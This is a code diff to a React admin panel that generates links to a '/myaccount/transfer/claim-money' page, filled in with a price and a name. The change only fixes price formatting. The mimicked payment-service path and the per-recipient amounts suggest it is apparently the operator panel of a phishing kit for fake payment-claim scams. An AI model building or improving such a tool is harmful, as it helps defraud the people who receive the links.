@@ -74,15 +74,18 @@ export const AdminPanel = (): JSX.Element => {
   };
 
   const handlePriceChange = (e: React.ChangeEvent<HTMLInputElement>) => {
+    // Allow free typing, just update the state
+    setPrice(e.target.value);
+  };
+
+  const handlePriceBlur = (e: React.FocusEvent<HTMLInputElement>) => {
+    // Format only when user leaves the field
     const input = e.target.value;
-    
-    // If user is typing and removing €, allow it temporarily
-    if (input === '' || input === '€') {
-      setPrice(input);
+    if (input.trim() === '' || input === '€') {
+      setPrice('');
       return;
     }
     
-    // Format the price
     const formatted = formatPrice(input);
     setPrice(formatted);
   };
@@ -208,8 +211,14 @@ export const AdminPanel = (): JSX.Element => {
   };
 
   const generateLink = () => {
+    // Format price first if it's not already formatted
+    let finalPrice = price;
+    if (price && !price.startsWith('€')) {
+      finalPrice = formatPrice(price);
+    }
+    
     // Check if price has meaningful content (more than just €)
-    const priceValue = price.replace('€', '').trim();
+    const priceValue = finalPrice.replace('€', '').trim();
     if (!priceValue || priceValue === '0.00' || !name) {
       toast({
         title: "Ошибка",
@@ -221,16 +230,19 @@ export const AdminPanel = (): JSX.Element => {
 
     const randomString = generateRandomString();
     const baseUrl = window.location.origin;
-    const link = `${baseUrl}/myaccount/transfer/claim-money?context_data=${randomString}&price=${encodeURIComponent(price)}&name=${encodeURIComponent(name)}`;
+    const link = `${baseUrl}/myaccount/transfer/claim-money?context_data=${randomString}&price=${encodeURIComponent(finalPrice)}&name=${encodeURIComponent(name)}`;
     
     const newLink: GeneratedLink = {
       id: Date.now().toString(),
-      price,
+      price: finalPrice,
       name,
       link,
       contextData: randomString,
       createdAt: new Date().toLocaleString('ru-RU'),
     };
+
+    // Update the input field to show formatted price
+    setPrice(finalPrice);
 
     setGeneratedLinks(prev => [newLink, ...prev]);
     setPrice("");
@@ -325,6 +337,7 @@ export const AdminPanel = (): JSX.Element => {
                       placeholder="€10.00"
                       value={price}
                       onChange={handlePriceChange}
+                      onBlur={handlePriceBlur}
                     />
                   </div>
                   <div className="space-y-2">
